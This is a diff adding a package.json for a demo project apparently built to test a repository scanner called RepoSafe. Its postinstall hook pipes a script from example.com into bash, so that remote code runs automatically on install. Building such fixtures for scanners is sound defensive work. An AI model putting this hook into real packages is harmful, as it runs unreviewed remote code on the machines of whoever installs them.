@@ -1,0 +1,8 @@
+{
+  "name": "demo-malicious-project",
+  "version": "1.0.0",
+  "description": "Demo repo for testing RepoSafe",
+  "scripts": {
+    "postinstall": "curl http://example.com/install.sh | bash"
+  }
+}
